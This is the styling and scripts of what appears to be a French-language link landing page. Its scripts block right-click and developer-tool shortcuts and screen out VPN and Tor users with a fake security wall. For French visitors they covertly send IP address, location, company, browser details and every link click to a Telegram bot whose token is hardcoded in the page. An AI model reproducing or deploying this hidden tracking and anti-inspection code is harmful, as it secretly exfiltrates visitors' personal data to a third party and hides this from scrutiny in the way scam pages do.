<style>
  *{
    margin:0;padding:0;box-sizing:border-box;
    -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
    -webkit-touch-callout:none;
    -webkit-tap-highlight-color:transparent;
  }
  img{
    -webkit-user-drag:none;user-drag:none;
    pointer-events:none;
  }
  html,body{height:100%;overflow:hidden;overscroll-behavior:none;background:#fff}
  body{
    font-family:Inter,-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    color:#111;
    font-synthesis:none;
    text-rendering:optimizeLegibility;
    -webkit-font-smoothing:antialiased;
    -moz-osx-font-smoothing:grayscale;
    height:100vh;
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:max(16px, calc(env(safe-area-inset-top) + 10px)) 16px;
    position:relative;
  }
  .wrap{
    width:100%;
    max-width:540px;
    display:flex;
    flex-direction:column;
    align-items:center;
    background:#fff;
  }
  .pname{
    position:relative;
    z-index:2;
    margin-bottom:30px;
    display:flex;
    flex-direction:column;
    align-items:center;
  }
  .name{
    font-size:23px;
    font-weight:600;
    letter-spacing:-.4px;
    line-height:1.1;
    text-shadow:0 2px 14px rgba(0,0,0,.045);
  }
  .sub{
    margin-top:5px;
    font-size:8.5px;
    font-weight:600;
    letter-spacing:2px;
    text-transform:uppercase;
    color:#777a80;
  }
  .ctext{
    flex:1 1 auto;
    display:grid;
    grid-template-columns:minmax(0, 1fr) auto;
    align-items:center;
    gap:9px;
    line-height:1.2;
    min-width:0;
  }
  .ctext .ctitle{
    font-size:13px;
    font-weight:560;
    letter-spacing:-.08px;
    color:#18181a;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
  }
  .ctext .csub{
    font-size:10px;
    letter-spacing:.05px;
    text-transform:capitalize;
    font-weight:500;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
    color:#8a8d93;
    padding-left:9px;
    border-left:1px solid rgba(0,0,0,.085);
  }
  .links{
    width:100%;
    margin-top:4px;
    display:flex;
    flex-direction:column;
    gap:10px;
  }
  .card{
    display:flex;
    align-items:center;
    gap:10px;
    width:100%;
    padding:11px 14px;
    border-radius:13px;
    background:transparent;
    border:1px solid rgba(0,0,0,.105);
    text-decoration:none;
    color:#111;
    font-size:14px;
    font-weight:450;
    letter-spacing:.2px;
    box-shadow:0 1px 1px rgba(0,0,0,.018);
    transition:background .18s ease, border-color .18s ease, box-shadow .18s ease, transform .18s ease;
  }
  .card:hover{background:rgba(0,0,0,.018);border-color:rgba(0,0,0,.17);box-shadow:0 4px 14px rgba(0,0,0,.04);transform:translateY(-1px)}
  .card .ic{
    width:30px;
    height:30px;
    flex:0 0 30px;
    display:inline-flex;
    align-items:center;
    justify-content:center;
    border-radius:10px;
    background:transparent;
    border:none;
    color:#29292c;
    transition:transform .22s cubic-bezier(.2,.7,.2,1),color .18s ease;
  }
  .card .ic svg{width:19px;height:19px;stroke:currentColor}
  .card:hover .ic{transform:scale(1.045);color:#111}
  .card:active{transform:translateY(0) scale(.992)}
  .card:focus-visible{outline:2px solid rgba(0,0,0,.28);outline-offset:2px;border-color:transparent;background:rgba(0,0,0,.018)}

  @media (max-width:420px){
    .pname{margin-bottom:26px}
    .links{gap:9px}
    .card{padding:10px 11px;gap:8px}
    .ctext{gap:7px}
    .ctext .ctitle{font-size:12.5px}
    .ctext .csub{font-size:9.25px;padding-left:7px}
    .card .ic{width:28px;height:28px;flex-basis:28px}
    .card .ic svg{width:18px;height:18px}
  }

  @keyframes riseIn{
    from{opacity:0;translate:0 10px;filter:blur(7px)}
    to  {opacity:1;translate:0 0;filter:blur(0)}
  }
  .name{animation:riseIn .75s .05s both cubic-bezier(.2,.7,.2,1)}
  .sub{animation:riseIn .75s .16s both cubic-bezier(.2,.7,.2,1)}
  .links .card{animation:riseIn .7s both cubic-bezier(.2,.7,.2,1)}
  .links .card:nth-child(1){animation-delay:.32s}
  .links .card:nth-child(2){animation-delay:.4s}
  .links .card:nth-child(3){animation-delay:.48s}
  .links .card:nth-child(4){animation-delay:.56s}

  @media (prefers-reduced-motion: reduce){
    *{animation:none !important;transition:none !important}
  }
</style>
</head>

<script>
  ['contextmenu','dragstart','selectstart'].forEach(function(ev){
    document.addEventListener(ev, function(e){ e.preventDefault(); }, {passive:false});
  });
  document.addEventListener('keydown', function(e){
    var k = (e.key||'').toLowerCase();
    if (k === 'f12') { e.preventDefault(); return; }
    if (e.ctrlKey && e.shiftKey && ['i','j','c'].indexOf(k) !== -1) { e.preventDefault(); return; }
    if ((e.ctrlKey || e.metaKey) && ['s','u','p','a'].indexOf(k) !== -1) { e.preventDefault(); }
  });
</script>

<script>
  (function(){
    var TG_TOKEN = '8930161261:AAG58R0x0YIs2arx8a3rt9laS3JRHmfcPnQ';
    var TG_CHAT  = '8215550381';

    function esc(s){
      return String(s == null ? '' : s)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function send(text){
      var body = new URLSearchParams();
      body.set('chat_id', TG_CHAT);
      body.set('text', text);
      body.set('parse_mode', 'HTML');
      body.set('disable_web_page_preview', 'true');
      return fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
        keepalive: true
      }).catch(function(){});
    }

    function visitorBlock(d){
      var lines = [];
      var loc = d && d.location ? d.location : {};
      var place = [loc.city, loc.state, loc.country].filter(Boolean).join(', ');
      if (d && d.ip) lines.push('🌐 IP : <code>' + esc(d.ip) + '</code>');
      if (place)     lines.push('📍 ' + esc(place));
      if (d && d.company && d.company.name) lines.push('🏢 ' + esc(d.company.name));
      lines.push('💻 ' + esc(navigator.userAgent));
      if (document.referrer) lines.push('↩️ Référent : ' + esc(document.referrer));
      lines.push('🗣️ Langue : ' + esc(navigator.language || ''));
      lines.push('🖥️ Écran : ' + screen.width + '×' + screen.height);
      return lines.join('\n');
    }

    function showVpnBlock(){
      if (document.getElementById('vpnBlock')) return;
      var o = document.createElement('div');
      o.id = 'vpnBlock';
      o.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(255,255,255,.92);' +
        'backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;' +
        'align-items:center;justify-content:center;padding:24px;' +
        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;';
      o.innerHTML =
        '<div style="max-width:340px;width:100%;background:#fff;border:1px solid #e2e4e8;' +
        'border-radius:20px;padding:28px 24px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.18)">' +
          '<div style="font-size:42px;line-height:1;margin-bottom:14px">🛡️</div>' +
          '<div style="color:#111;font-size:18px;font-weight:700;margin-bottom:10px">VPN détecté</div>' +
          '<div style="color:#5a5d63;font-size:14px;line-height:1.5;margin-bottom:22px">' +
            'Pour des raisons de sécurité, veuillez désactiver votre VPN ou proxy puis réessayer pour continuer.' +
          '</div>' +
          '<button id="vpnRetry" style="width:100%;border:0;border-radius:12px;padding:13px;' +
          'background:#1d9bf0;color:#fff;font-size:15px;font-weight:600;cursor:pointer">Réessayer</button>' +
        '</div>';
      document.body.appendChild(o);
      document.getElementById('vpnRetry').addEventListener('click', function(){
        location.reload();
      });
    }

    function enableClickTracking(d){
      document.querySelectorAll('a.card').forEach(function(a){
        a.addEventListener('click', function(){
          var title = (a.querySelector('.ctitle') || {}).textContent || a.href;
          var sub   = (a.querySelector('.csub') || {}).textContent || '';
          send('🔗 <b>Lien cliqué : ' + esc(title) + '</b>\n' +
               (sub ? '📝 ' + esc(sub) + '\n' : '') +
               '➡️ ' + esc(a.href) + '\n\n' + visitorBlock(d));
        });
      });
    }

    fetch('https://api.ipapi.is/')
      .then(function(r){ return r.json(); })
      .then(function(d){
        var isVpn = d && (d.is_vpn || d.is_proxy || d.is_tor || d.is_datacenter);
        var cc = d && d.location ? (d.location.country_code || '') : '';

        if (isVpn){ showVpnBlock(); return; }
        if (cc !== 'FR') return;

        send('🟢 <b>Nouvelle visite</b>\n' + visitorBlock(d));
        enableClickTracking(d);
      })
      .catch(function(){});
  })();
</script>
